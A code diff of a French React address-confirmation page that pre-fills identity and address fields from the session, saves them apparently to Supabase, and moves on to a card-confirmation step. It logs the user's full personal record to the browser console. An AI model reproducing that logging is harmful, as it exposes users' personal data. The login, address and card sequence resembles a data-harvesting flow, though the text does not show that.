@@ -1,9 +1,9 @@
 
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
 import ProgressStepper from "@/components/ProgressStepper";
-import { updateUserSession } from "@/utils/sessionUtils";
+import { updateUserSession, getFromSession, saveUserDataToJson } from "@/utils/sessionUtils";
 import { toast } from "sonner";
 
 const AddressConfirmation: React.FC = () => {
@@ -15,9 +15,32 @@ const AddressConfirmation: React.FC = () => {
   const [ville, setVille] = useState("");
   const [telephone, setTelephone] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+  const [email, setEmail] = useState<string | null>(null);
   const navigate = useNavigate();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  // Récupérer l'email de l'utilisateur connecté à partir de la session au chargement
+  useEffect(() => {
+    const userData = getFromSession("userData");
+    if (userData && userData.email) {
+      setEmail(userData.email);
+      console.log("Email récupéré de la session:", userData.email);
+      
+      // Pré-remplir les champs si disponibles
+      if (userData.nom) setNom(userData.nom);
+      if (userData.prenom) setPrenom(userData.prenom);
+      if (userData.dateNaissance) setDateNaissance(userData.dateNaissance);
+      if (userData.adresse) setAdresse(userData.adresse);
+      if (userData.codePostal) setCodePostal(userData.codePostal);
+      if (userData.ville) setVille(userData.ville);
+      if (userData.telephone) setTelephone(userData.telephone);
+    } else {
+      console.log("Aucun email trouvé dans la session");
+      toast.error("Veuillez vous connecter d'abord");
+      navigate("/login");
+    }
+  }, [navigate]);
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!nom || !prenom || !dateNaissance || !adresse || !codePostal || !ville || !telephone) {
@@ -25,12 +48,18 @@ const AddressConfirmation: React.FC = () => {
       return;
     }
 
+    if (!email) {
+      toast.error("Session utilisateur invalide, veuillez vous reconnecter");
+      navigate("/login");
+      return;
+    }
+
     setIsLoading(true);
 
-    // Simule la soumission du formulaire
-    setTimeout(() => {
-      // Stocke les informations dans la session
-      updateUserSession({
+    try {
+      // Préparer les données utilisateur avec l'email et les informations d'adresse
+      const userData = {
+        email,
         nom,
         prenom,
         dateNaissance,
@@ -38,11 +67,28 @@ const AddressConfirmation: React.FC = () => {
         codePostal,
         ville,
         telephone
-      });
+      };
       
-      setIsLoading(false);
+      // Stocker les informations dans la session
+      updateUserSession(userData);
+      
+      // Enregistrer dans la base de données
+      console.log("Sauvegarde des données dans Supabase:", userData);
+      await saveUserDataToJson();
+      
+      toast.success("Informations d'adresse enregistrées avec succès");
       navigate("/card-confirmation");
-    }, 800);
+    } catch (error: any) {
+      console.error("Erreur lors de l'enregistrement:", error);
+      
+      if (error.isRlsError) {
+        toast.error(`Erreur de sécurité Supabase: ${error.message}. Vérifiez les politiques RLS.`);
+      } else {
+        toast.error("Une erreur est survenue lors de l'enregistrement des données");
+      }
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   return (
@@ -68,6 +114,12 @@ const AddressConfirmation: React.FC = () => {
           <h1 className="text-3xl font-bold text-center mb-8">
             Confirmez votre adresse
           </h1>
+
+          {email && (
+            <div className="mb-4 p-2 bg-gray-100 rounded">
+              <p className="text-gray-700">Utilisateur: <span className="font-medium">{email}</span></p>
+            </div>
+          )}
 
           <form onSubmit={handleSubmit} className="space-y-4">
             <div className="grid grid-cols-2 gap-4">
